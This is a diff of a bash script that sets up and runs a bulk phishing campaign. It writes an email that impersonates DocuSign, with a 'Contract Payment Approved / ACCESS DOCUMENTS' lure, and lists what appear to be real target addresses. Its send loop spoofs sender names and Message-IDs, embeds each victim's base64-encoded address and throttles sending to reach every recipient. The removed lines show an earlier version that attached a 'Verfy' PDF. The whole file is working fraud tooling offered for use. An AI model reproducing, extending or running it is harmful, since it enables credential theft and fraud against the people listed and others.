@@ -83,8 +83,6 @@ echo "Installing mailutils..."
 sudo apt-get install mailutils -y
 sudo apt-get install html2text -y
 sudo apt-get install parallel base64 -y
-sudo apt install wkhtmltopdf -y
-sudo apt-get install wkhtmltopdf -y
 sudo chown $USER:$USER *
 
 # Create a sample HTML email content (email.html)
@@ -122,6 +120,7 @@ If you have trouble signing, visit "<a style="color: rgb(36, 99, 209); text-deco
 <img width="18" height="18" class="CToWUd" style="margin-right: 7px; vertical-align: middle;" alt="" src="" data-image-whitelisted="" data-bit="iit">Download the<span>&nbsp;</span><span class="il">Docusign</span><span>&nbsp;</span>App</a></p><p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 14px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 10px;'>This message was sent to you by Michael Romey who is using the<span>&nbsp;</span><span class="il">Docusign</span>
 <span>&nbsp;</span>
 Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.</p></td></tr></tbody></table></body></html>
+
 EOL
 
 # Create a sample txt subject content (subject.txt)
@@ -197,8 +196,11 @@ EOL
 # Create a sample txt list content (list.txt)
 echo "Creating list.txt with list content..."
 cat > list.txt <<EOL
-zruba@vnkgroup-ks.com
-prodaja@vbuilding.rs
+boxxfc@gmail.com
+info@brickx.com
+gwenna@gwennakadima.com
+mackenzie@walshequipment.ca
+podpora@vsezapivo.si
 EOL
 
 # Create the sending script (send.sh)
@@ -217,10 +219,6 @@ LOG_FILE="send_log_\$(date +%Y%m%d).txt"
 TOTAL=\$(wc -l < "\$EMAIL_LIST")
 SUCCESS=0
 FAILED=0
-
-# Ensure runtime dir is set to avoid wkhtmltopdf error
-export XDG_RUNTIME_DIR="\${XDG_RUNTIME_DIR:-/tmp/runtime-\$UID}"
-mkdir -p "\$XDG_RUNTIME_DIR"
 
 # Verify required files exist
 for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
@@ -246,16 +244,19 @@ get_random_number() {
 
 # Process each email
 while IFS= read -r email; do
-    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\r\n')
+    # Clean and parse email address
+    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
     EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
     EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
     CURRENT_DATE=\$(date +%Y-%m-%d)
     BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)
 
+    # Generate random elements
     RANDOM_NAME=\$(get_random_name)
     RANDOM_NUMBER=\$(get_random_number)
     SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
-
+    
+    # Select subject and REPLACE ITS VARIABLES
     SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
     SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
         -e "s|{date}|\$CURRENT_DATE|g" \
@@ -267,10 +268,12 @@ while IFS= read -r email; do
         -e "s|{random-number}|\$RANDOM_NUMBER|g")
 
     echo "Processing: \$CLEAN_EMAIL"
-
+    
+    # Generate unique Message-ID
     MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
-
-    TEMP_HTML=\$(mktemp --suffix=".html")
+    
+    # Create temporary HTML file with replaced variables
+    TEMP_HTML=\$(mktemp)
     sed \
         -e "s|{date}|\$CURRENT_DATE|g" \
         -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
@@ -283,54 +286,52 @@ while IFS= read -r email; do
         -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
         -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
         "\$HTML_TEMPLATE" > "\$TEMP_HTML"
-
-    # Convert to PDF using wkhtmltopdf with local file URI
-    SAFE_EMAIL=\$(echo "\$CLEAN_EMAIL" | sed 's/[^a-zA-Z0-9@.]/_/g')
-    PDF_FILE="/tmp/Verfy_\${SAFE_EMAIL}.pdf"
-    HTML_FILE_URI="file://\$TEMP_HTML"
-
-    if ! wkhtmltopdf --quiet --enable-local-file-access --load-error-handling ignore "\$HTML_FILE_URI" "\$PDF_FILE" >/dev/null 2>&1; then
-        echo "\$(date) - WARNING: PDF generation failed for \$CLEAN_EMAIL" >> "\$LOG_FILE"
-        PDF_FILE=""
-    fi
-
+    
+    # Send with dynamic content
+    # Create text version
     TEMP_TEXT=\$(mktemp)
     cat <<EOF > "\$TEMP_TEXT"
-Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.
+Webmail - Mail. Host. Online
 
-Webmail © 2026. All rights reserved.
+Email Account Status Changed
+
+Hi \$EMAIL_USER,
+
+Contract Payment Approved
+
+" Please reconfirm this order before we release payment."
+
+Use the button below to review  the order and sign document(s)
+
+ACCESS DOCUMENTS
+
 EOF
 
-    {
-    echo "Return-Path: <$username@$domain>"
-    echo "From: \"\$SELECTED_SENDER_NAME\" <$username@$domain>"
-    echo "To: <\$CLEAN_EMAIL>"
-    echo "Subject: \$SELECTED_SUBJECT"
-    echo "MIME-Version: 1.0"
-    echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
-    echo
-    echo "--BOUNDARY"
-    echo "Content-Type: text/plain; charset=UTF-8"
-    echo
-    cat "\$TEMP_TEXT"
-    echo
+# Send with both HTML and text
+cat <<EOF | /usr/sbin/sendmail -t -oi
+Return-Path: <$username@$domain>
+From: "\$SELECTED_SENDER_NAME" <$username@$domain>
+To: <\$CLEAN_EMAIL>
+Subject: \$SELECTED_SUBJECT
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"
 
-    if [ -f "\$PDF_FILE" ]; then
-        echo "--BOUNDARY"
-        echo "Content-Type: application/pdf; name=\"Verfy \$CLEAN_EMAIL.pdf\""
-        echo "Content-Transfer-Encoding: base64"
-        echo "Content-Disposition: attachment; filename=\"Verfy \$CLEAN_EMAIL.pdf\""
-        echo
-        base64 "\$PDF_FILE"
-        echo
-    fi
+--MULTIPART_BOUNDARY
+Content-Type: text/plain; charset=UTF-8
 
-    echo "--BOUNDARY--"
-    } | /usr/sbin/sendmail -t -oi
+\$(cat "\$TEMP_TEXT")
 
-    rm "\$TEMP_TEXT" "\$TEMP_HTML"
-    [ -f "\$PDF_FILE" ] && rm "\$PDF_FILE"
+--MULTIPART_BOUNDARY
+Content-Type: text/html; charset=UTF-8
 
+\$(cat "\$TEMP_HTML")
+
+--MULTIPART_BOUNDARY--
+EOF
+
+    rm "\$TEMP_TEXT"
+
+    # Check exit status and clean up
     if [ \$? -eq 0 ]; then
         echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
         ((SUCCESS++))
@@ -338,13 +339,18 @@ EOF
         echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
         ((FAILED++))
     fi
-
+    
+    rm "\$TEMP_HTML"
+    
+    # Dynamic delay (0.5-3 seconds)
     sleep \$(awk -v min=0.1 -v max=0.3 'BEGIN{srand(); print min+rand()*(max-min)}')
-
+    
+    # Progress indicator
     echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
-
+    
 done < "\$EMAIL_LIST"
 
+# Final report
 echo "Completed at \$(date)" >> "\$LOG_FILE"
 echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
 echo "Full log: \$LOG_FILE"
